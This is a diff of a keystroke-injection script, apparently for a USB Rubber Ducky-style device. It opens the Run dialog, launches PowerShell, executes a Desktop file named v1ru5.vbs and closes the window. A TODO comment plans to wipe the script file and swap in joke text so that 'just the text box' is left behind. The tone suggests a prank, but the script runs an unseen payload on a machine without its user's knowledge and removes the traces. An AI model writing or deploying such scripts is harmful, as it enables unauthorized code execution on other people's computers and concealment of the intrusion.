@@ -25,13 +25,17 @@ ALT F4
 
 REM run in PS
 GUI r
-
-REM Execute payload 
 STRING powershell
 ENTER
+
+REM Execute payload 
 DELAY 150
 STRING .\Desktop\v1ru5.vbs
 ENTER
+
+REM TODO: cleanly and consistently wipe v1ru5.vbs and replace it with a copypasta, recipe for borscht, or something douchier
+
+REM close powershell, hopefully just leaving the text box behind.
 DELAY 250
 ALT TAB
 STRING exit
